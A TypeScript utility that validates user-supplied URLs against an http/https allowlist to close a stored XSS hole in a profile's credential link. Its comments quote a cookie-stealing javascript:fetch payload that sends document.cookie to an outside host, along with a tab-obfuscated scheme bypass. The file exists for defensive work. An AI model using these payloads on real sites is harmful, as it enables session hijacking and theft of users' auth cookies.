/**
 * Turning a user-supplied string into an `href` that is safe to render.
 *
 * `achievements.credential_url` is free text typed by one user and rendered as a
 * link to *others* — `hub-profile-modal.tsx` shows the achievements of whoever's
 * message you tapped. Nothing validated it on the way in: the `type="url"` input
 * in `achievements-section.tsx` is not inside a `<form>`, so browser constraint
 * validation never fires, and the value goes straight from the browser client to
 * Postgres with no server-side check. `javascript:fetch('https://…'+document.cookie)`
 * stored there became a working link in every other member's session, in this
 * origin, with the Supabase auth cookie readable from script.
 *
 * The two hand-rolled helpers this replaces — `normalizeUrl` in
 * `profile-manager.tsx` and `renderSocialUrl` in `hub-profile-modal.tsx` —
 * happened to be safe, but only by accident: both force an `https://` prefix
 * onto anything not already `http(s)://`, so a `javascript:` value came out as
 * the harmless nonsense `https://javascript:alert(1)`. That is luck, not a
 * check, and it silently mangles the URL instead of telling anyone it was bad.
 */

/**
 * Only these reach an `href`. An allowlist rather than a `javascript:` denylist,
 * because the interesting schemes are the ones nobody thought to list —
 * `vbscript:`, `data:`, and whatever a future browser adds.
 */
const ALLOWED_PROTOCOLS = new Set(['http:', 'https:'])

/**
 * Does this look like it already carries a scheme, per RFC 3986's
 * `ALPHA *( ALPHA / DIGIT / "+" / "-" / "." )`?
 *
 * Tabs, newlines and carriage returns are stripped first because the URL parser
 * ignores them mid-string — `java\tscript:alert(1)` parses as the `javascript`
 * scheme. Without stripping them, an obfuscated scheme reads as a bare hostname
 * and takes the prefixing path below.
 */
function hasScheme(value: string): boolean {
  return /^[a-z][a-z0-9+.-]*:/i.test(value.replace(/[\t\n\r]/g, ''))
}

/**
 * Normalize a user-supplied URL, or return null if it cannot be made safe.
 *
 * Values with no scheme are treated as the bare host the user meant to type —
 * `linkedin.com/in/someone` — and get `https://` prepended, which is the
 * behaviour both call sites already had. `bareHostPrefix` covers the case where
 * even the host is implied, e.g. a GitHub username on its own.
 *
 * Validation is delegated to `new URL()` rather than to a regex of my own: it is
 * the same WHATWG parser the browser will use on the resulting `href`, so its
 * verdict on where the scheme ends is by definition the one that matters. A
 * hand-written check can disagree with it — that disagreement is exactly what
 * the tab trick above exploits.
 *
 * Returns the parsed, normalized `href`, so what gets rendered is the string the
 * parser vouched for and not the raw input.
 */
export function safeExternalUrl(
  raw: string | null | undefined,
  bareHostPrefix = ''
): string | null {
  if (typeof raw !== 'string') return null
  const trimmed = raw.trim()
  if (!trimmed) return null

  // Prepending `https://` can only ever yield protocol `https:`, so the
  // prefixing branch needs no separate scheme check — but it must not be reached
  // by something that already had a scheme, or `javascript:x` would be reshaped
  // into a valid-looking URL instead of rejected.
  const candidate = hasScheme(trimmed) ? trimmed : `https://${bareHostPrefix}${trimmed}`

  let parsed: URL
  try {
    // Also where the genuinely malformed go: a bare `https://` with no host,
    // `https://?q`, and anything whose prefixed form has no hostname all throw
    // here rather than needing a check of their own.
    parsed = new URL(candidate)
  } catch {
    return null
  }

  if (!ALLOWED_PROTOCOLS.has(parsed.protocol)) return null

  return parsed.href
}

/** Whether a value would survive `safeExternalUrl`. For validating input. */
export function isSafeExternalUrl(raw: string | null | undefined): boolean {
  return safeExternalUrl(raw) !== null
}
